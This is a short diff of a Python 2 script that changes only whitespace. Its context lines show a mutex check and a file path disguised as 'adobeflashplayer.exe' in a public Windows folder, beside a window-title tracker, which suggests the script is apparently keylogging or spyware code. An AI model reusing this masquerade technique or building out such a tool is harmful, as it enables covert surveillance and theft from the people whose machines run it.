@@ -18,7 +18,7 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     print "nope"
     sys.exit()
 
-x, data, count= '', '', 0
+x, data, count= '', '', 0 
 
 dir = r"C:\Users\Public\Libraries\adobeflashplayer.exe"
 lastWindow = ''
